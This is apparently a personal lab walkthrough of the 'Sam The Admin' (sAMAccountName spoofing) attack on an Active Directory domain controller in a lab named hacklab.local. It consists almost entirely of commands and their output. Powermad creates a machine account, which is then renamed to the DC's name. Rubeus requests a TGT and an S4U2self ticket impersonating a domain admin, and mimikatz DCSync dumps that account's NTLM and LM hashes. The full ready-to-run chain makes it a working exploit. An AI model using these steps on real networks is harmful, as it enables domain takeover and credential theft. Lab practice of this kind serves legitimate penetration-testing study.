Sam The Admin

Manual approach 

You need the DC's hostname.

.\Rubeus.exe purge
powershell.exe -nop -exec bypass
Import-Module .\Powermad.ps1
Import-Module .\PowerView.ps1
$machine_account_password = ConvertTo-SecureString 'Passw0rd!' -AsPlainText -Force ; New-MachineAccount -MachineAccount TestSPN -Password $machine_account_password
Set-DomainObject "CN=TestSPN,CN=Computers,DC=hacklab,DC=local" -Clear 'serviceprincipalname'
Set-MachineAccountAttribute -MachineAccount TestSPN -Value "WIN-45FFNRN974K" -Attribute samaccountname
.\Rubeus.exe asktgt /user:WIN-45FFNRN974K /password:Passw0rd! /domain:hacklab.local /dc:WIN-45FFNRN974K.hacklab.local /nowrap
Set-MachineAccountAttribute -MachineAccount TestSPN -Value "TestSPN" -Attribute samaccountname
.\Rubeus.exe s4u /impersonateuser:DA1 /nowrap /dc:WIN-45FFNRN974K.hacklab.local /self /altservice:LDAP/WIN-45FFNRN974K.hacklab.local /ptt /ticket:ADD
.\Rubeus.exe klist
.\mimikatz.exe
lsadump::dcsync /domian:hacklab.local /user:da1



----------------

#Check privs

Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\f.nutter\Desktop\Test> net user /domain f.nutter
The request will be processed at a domain controller for domain hacklab.local.

User name                    f.nutter
Full Name
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            4/28/2022 4:43:34 AM
Password expires             6/9/2022 4:43:34 AM
Password changeable          4/29/2022 4:43:34 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   4/28/2022 4:47:28 AM

Logon hours allowed          All

Local Group Memberships
Global Group memberships     *Domain Users
The command completed successfully.

PS C:\Users\f.nutter\Desktop\Test>

----------------

#Clear you present ticket

PS C:\Users\f.nutter\Desktop\Test> .\Rubeus.exe purge

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.1


[*] Action: Purge Tickets
Luid: 0x0
[+] Tickets successfully purged!

----------------

PS C:\Users\f.nutter\Desktop\Test> powershell.exe -nop -exec bypass
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

----------------

#Import Powermad

PS C:\Users\f.nutter\Desktop\Test> Import-Module .\Powermad.ps1

----------------

#Import PowerView

PS C:\Users\f.nutter\Desktop\Test> Import-Module .\PowerView.ps1

----------------

# Create Machine Account - https://github.com/Kevin-Robertson/Powermad/blob/master/Powermad.ps1

PS C:\Users\f.nutter\Desktop\Test> $machine_account_password = ConvertTo-SecureString 'Passw0rd!' -AsPlainText -Force ; New-MachineAccount -MachineAccount TestSPN -Password $machine_account_password
[+] Machine account TestSPN added

----------------
# Clear SPN for the computer account - https://github.com/ZeroDayLab/PowerSploit/blob/master/Recon/PowerView.ps1

PS C:\Users\f.nutter\Desktop\Test> Set-DomainObject "CN=TestSPN,CN=Computers,DC=hacklab,DC=local" -Clear 'serviceprincipalname'

----------------

# Change Machine Account samaccountname for the computer you added to the DC name - https://github.com/Kevin-Robertson/Powermad/blob/master/Powermad.ps1

PS C:\Users\f.nutter\Desktop\Test> Set-MachineAccountAttribute -MachineAccount TestSPN -Value "WIN-45FFNRN974K" -Attribute samaccountname
[+] Machine account TestSPN attribute samaccountname updated

----------------

# Request TGT

PS C:\Users\f.nutter\Desktop\Test> .\Rubeus.exe asktgt /user:WIN-45FFNRN974K /password:Passw0rd! /domain:hacklab.local /dc:WIN-45FFNRN974K.hacklab.local /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.1

[*] Action: Ask TGT

[*] Using rc4_hmac hash: FC525C9683E8FE0670007C971889
[*] Building AS-REQ (w/ preauth) for: 'hacklab.local\WIN-45FFNRN974K'
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIFRjCCBUKgAwIBBaEDAgEWooIEUTCCBE1hggRJMIIERaADA007QUyiIjAgoAMCAQKhGTAXGwZrcmJ0Z3QbDWhhY2tsYWIubG9jYWyjg007KiggP1BIID8aZLuuNtS7H+OePFLhlXOTpOO9ugQLcU+pt6+zh723IF/1ygQuSGE5dQQhwcCDdY6JEeu3VG1I1SacyXqfS+fnZ5xWcSy0jEL6MlnayZjnuSEQv0jEohW6XGmwDYWORr046uPlOkPkzj2F8BF3m/EdcfxtYxNhYiKpg3H7tOc7E3d+cy8mUqDwAYjbmkN/lngNHnQw9jzanAltf24fstSmQxapSKpjTfR0kHbohughdDPTvBGa9wwwk52x0tCXa3mmpdXp/10r1SlDUJyKX5OyRixE/OBpBt5FP+nHVifjusmLdXHlq9XPzi1YkbRNF3p9ed42tPdVQGBK4QVPfLr3MY0j2e+qUNStNEeQGMBsHlt/DLqNywJfSInOPF8Rx007oSR2KG6nuN8eLgnM0+JkZ9f5BwEegQGmclUZlduPdAf2RnT+V/v3+TsPGzUMlu3MWjgYSDwk9xlZRGNmoU0QDqDg6O-Redacted-+AkFcVsnzFkcpjm8oCAQGhEzARGw9XSU4tNDVGRk5STjk3NEujBwMFAEDhAAClERgPMjAyMjA0MjgxMjAzMDFaphEYDzIwMjIwNDI4MjIwMzAxWqcRGA8yMDIyMDUwNTEyMDMwMVqoDxsNSEFDS0xBQi5MT0NBTKkiMCCgAwIBAqEZMBcbBmtyYnRndBsNaGFja2xhYi5sb2NhbA==

  ServiceName              :  krbtgt/hacklab.local
  ServiceRealm             :  HACKLAB.LOCAL
  UserName                 :  WIN-45FFNRN974K
  UserRealm                :  HACKLAB.LOCAL
  StartTime                :  4/28/2022 5:03:01 AM
  EndTime                  :  4/28/2022 3:03:01 PM
  RenewTill                :  5/5/2022 5:03:01 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  lG57fpo-Redacted-2jM7FA==
  ASREP (key)              :  FC525-Redacted-DDC971889

----------------

# Change Machine Account samaccountname back to its original name - https://github.com/Kevin-Robertson/Powermad/blob/master/Powermad.ps1

PS C:\Users\f.nutter\Desktop\Test> Set-MachineAccountAttribute -MachineAccount TestSPN -Value "TestSPN" -Attribute samaccountname
[+] Machine account TestSPN attribute samaccountname updated

----------------

# Request S4U2self - PTH

PS C:\Users\f.nutter\Desktop\Test> .\Rubeus.exe s4u /impersonateuser:DA1 /nowrap /dc:WIN-45FFNRN974K.hacklab.local /self /altservice:LDAP/WIN-45FFNRN974K.hacklab.local /ptt /ticket:doIFRjCCBUKgAwIBBaEDAgEWooIEUTCCBE1hggRJMIIERaADA007QUyiIjAgoAMCAQKhGTAXGwZrcmJ0Z3QbDWhhY2tsYWIubG9jYWyjg007KiggP1BIID8aZLuuNtS7H+OePFLhlXOTpOO9ugQLcU+pt6+zh723IF/1ygQuSGE5dQQhwcCDdY6JEeu3VG1I1SacyXqfS+fnZ5xWcSy0jEL6MlnayZjnuSEQv0jEohW6XGmwDYWORr046uPlOkPkzj2F8BF3m/EdcfxtYxNhYiKpg3H7tOc7E3d+cy8mUqDwAYjbmkN/lngNHnQw9jzanAltf24fstSmQxapSKpjTfR0kHbohughdDPTvBGa9wwwk52x0tCXa3mmpdXp/10r1SlDUJyKX5OyRixE/OBpBt5FP+nHVifjusmLdXHlq9XPzi1YkbRNF3p9ed42tPdVQGBK4QVPfLr3MY0j2e+qUNStNEeQGMBsHlt/DLqNywJfSInOPF8Rx007oSR2KG6nuN8eLgnM0+JkZ9f5BwEegQGmclUZlduPdAf2RnT+V/v3+TsPGzUMlu3MWjgYSDwk9xlZRGNmoU0QDqDg6O-Redacted-+AkFcVsnzFkcpjm8oCAQGhEzARGw9XSU4tNDVGRk5STjk3NEujBwMFAEDhAAClERgPMjAyMjA0MjgxMjAzMDFaphEYDzIwMjIwNDI4MjIwMzAxWqcRGA8yMDIyMDUwNTEyMDMwMVqoDxsNSEFDS0xBQi5MT0NBTKkiMCCgAwIBAqEZMBcbBmtyYnRndBsNaGFja2xhYi5sb2NhbA==

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.1

[*] Action: S4U

[*] Action: S4U

[*] Using domain controller: WIN-45FFNRN974K.hacklab.local (192.168.68.200)
[*] Building S4U2self request for: 'WIN-45FFNRN974K@HACKLAB.LOCAL'
[*] Sending S4U2self request
[+] S4U2self success!
[*] Substituting alternative service name 'LDAP/WIN-45FFNRN974K.hacklab.local'
[*] Got a TGS for 'DA1' to 'LDAP@HACKLAB.LOCAL'
[*] base64(ticket.kirbi):

      doIFRjCCBUKgAwIBBaEDAgEWooIEUTCCBE1hggRJMIIERaADA007QUyiIjAgoAMCAQKhGTAXGwZrcmJ0Z3QbDWhhY2tsYWIubG9jYWyjg007KiggP1BIID8aZLuuNtS7H+OePFLhlXOTpOO9ugQLcU+pt6+zh723IF/1ygQuSGE5dQQhwcCDdY6JEeu3VG1I1SacyXqfS+fnZ5xWcSy0jEL6MlnayZjnuSEQv0jEohW6XGmwDYWORr046uPlOkPkzj2F8BF3m/EdcfxtYxNhYiKpg3H7tOc7E3d+cy8mUqDwAYjbmkN/lngNHnQw9jzanAltf24fstSmQxapSKpjTfR0kHbohughdDPTvBGa9wwwk52x0tCXa3mmpdXp/10r1SlDUJyKX5OyRixE/OBpBt5FP+nHVifjusmLdXHlq9XPzi1YkbRNF3p9ed42tPdVQGBK4QVPfLr3MY0j2e+qUNStNEeQGMBsHlt/DLqNywJfSInOPF8Rx007oSR2KG6nuN8eLgnM0+JkZ9f5BwEegQGmclUZlduPdAf2RnT+V/v3+TsPGzUMlu3MWjgYSDwk9xlZRGNmoU0QDqDg6O-Redacted-+AkFcVsnzFkcpjm8oCAQGhEzARGw9XSU4tNDVGRk5STjk3NEujBwMFAEDhAAClERgPMjAyMjA0MjgxMjAzMDFaphEYDzIwMjIwNDI4MjIwMzAxWqcRGA8yMDIyMDUwNTEyMDMwMVqoDxsNSEFDS0xBQi5MT0NBTKkiMCCgAwIBAqEZMBcbBmtyYnRndBsNaGFja2xhYi5sb2NhbA==

[+] Ticket successfully imported!

----------------

#Check the TGT imported - Client Name       : DA1 @ HACKLAB.LOCAL

PS C:\Users\f.nutter\Desktop\Test> .\Rubeus.exe klist

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.1


Action: List Kerberos Tickets (Current User)

[*] Current LUID    : 0x17d8cd0

  UserName                 : f.nutter
  Domain                   : HACKLAB
  LogonId                  : 0x17d8cd0
  UserSID                  : S-1-5-21-1648489478-6284396-2097038999-1638
  AuthenticationPackage    : Kerberos
  LogonType                : Interactive
  LogonTime                : 4/28/2022 4:43:46 AM
  LogonServer              : WIN-45FFNRN974K
  LogonServerDNSDomain     : HACKLAB.LOCAL
  UserPrincipalName        : f.nutter@hacklab.local

    [0] - 0x12 - aes256_cts_hmac_sha1
      Start/End/MaxRenew: 4/28/2022 5:03:28 AM ; 4/28/2022 3:03:01 PM ; 5/5/2022 5:03:01 AM
      Server Name       : LDAP/WIN-45FFNRN974K.hacklab.local @ HACKLAB.LOCAL
      Client Name       : DA1 @ HACKLAB.LOCAL
      Flags             : name_canonicalize, ok_as_delegate, pre_authent, renewable (a50000)
	  
----------------

#Verify privs

PS C:\Users\f.nutter\Desktop\Test> .\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # lsadump::dcsync /domian:hacklab.local /user:da1
[DC] 'hacklab.local' will be the domain
[DC] 'WIN-45FFNRN974K.hacklab.local' will be the DC server
[DC] 'da1' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : da1

** SAM ACCOUNT **

SAM Username         : da1
User Principal Name  : da1@hacklab.local
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Account expiration   :
Password last change : 3/16/2022 10:45:04 AM
Object Security ID   : S-1-5-21-1648489478-6284396-2097038999-1726
Object Relative ID   : 1726

Credentials:
  Hash NTLM: fc525c9683e8fe067095ba2ddc971889
    ntlm- 0: fc525c9683e8fe067095ba2ddc971889
    lm  - 0: e407650fad7227333869369496663e74



mimikatz # exit
Bye!
